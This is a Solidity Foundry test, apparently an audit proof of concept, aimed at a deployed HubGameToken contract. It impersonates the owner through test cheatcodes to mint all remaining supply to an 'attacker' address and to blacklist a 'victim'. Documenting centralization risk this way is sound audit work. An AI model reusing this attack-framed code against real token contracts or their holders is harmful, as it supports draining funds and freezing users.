```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "forge-std/Test.sol";

// Minimal interface for HubGameToken
interface IHubGameToken {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function totalMint() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function initGame(
        string memory _gameCode,
        uint256 _supplyToken,
        uint256 _listingDate,
        address[] memory _wallets,
        uint256[] memory _percents,
        address[] memory _signers,
        uint256[] memory _tgePercents,
        uint256[] memory _numOfPeriods,
        uint256[] memory _ciffs
    ) external returns (address gameAddress);
    function adminAdd(address[] memory _addresses) external;
    function blackListAdd(address[] memory _addresses) external;
    function transfer(address _receiver, uint256 _amount) external returns (bool);
    function isAdmin(address) external view returns (bool); // not in ABI but needed for validation
}

contract ExploitTest is Test {
    address constant TARGET = 0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5;
    IHubGameToken hub = IHubGameToken(TARGET);
    address attacker = address(0xdead);

    function setUp() public {
        vm.label(TARGET, "HubGameToken");
        vm.label(attacker, "attacker");
    }

    function testCentralizationRisk() public {
        // 1. Get current owner
        address owner = hub.owner();
        vm.label(owner, "owner");
        assertTrue(owner != address(0), "Owner should exist");

        // 2. Impersonate owner and mint all remaining tokens to attacker
        vm.startPrank(owner);

        uint256 totalSupply = hub.totalSupply();          // 50e18 (decimals=8)
        uint256 totalMinted = hub.totalMint();
        uint256 remainingWei = totalSupply - totalMinted; // unminted tokens
        uint256 remainingTokens = remainingWei / (10 ** uint256(hub.decimals()));

        require(remainingTokens > 0, "No tokens left to mint");

        // Prepare parameters for initGame
        string memory gameCode = "EXPLOIT";
        uint256 supplyToken = remainingTokens; // in whole tokens
        uint256 listingDate = block.timestamp;  // TGE immediate
        address[] memory wallets = new address[](1);
        wallets[0] = attacker;
        uint256[] memory percents = new uint256[](1);
        percents[0] = 100;

        address[] memory signers = new address[](1);
        signers[0] = attacker; // dummy signer

        uint256[] memory tgePercents = new uint256[](1);
        tgePercents[0] = 100; // 100% TGE

        uint256[] memory numOfPeriods = new uint256[](1);
        numOfPeriods[0] = 1;

        uint256[] memory ciffs = new uint256[](1);
        ciffs[0] = 0;

        // 3. Call initGame – mints all remaining supply to attacker (as system wallet)
        address gameAddr = hub.initGame(
            gameCode,
            supplyToken,
            listingDate,
            wallets,
            percents,
            signers,
            tgePercents,
            numOfPeriods,
            ciffs
        );
        vm.stopPrank();

        // 4. Verify attacker received the tokens
        uint256 attackerBalance = hub.balanceOf(attacker);
        assertEq(attackerBalance, remainingWei, "Attacker should have all remaining supply");

        // 5. Additional demonstration: owner can blacklist any user
        vm.prank(owner);
        address victim = address(0x123);
        address[] memory blacklist = new address[](1);
        blacklist[0] = victim;
        hub.blackListAdd(blacklist);
        // Victim cannot transfer (requires not being in blacklist)
    }
}
```
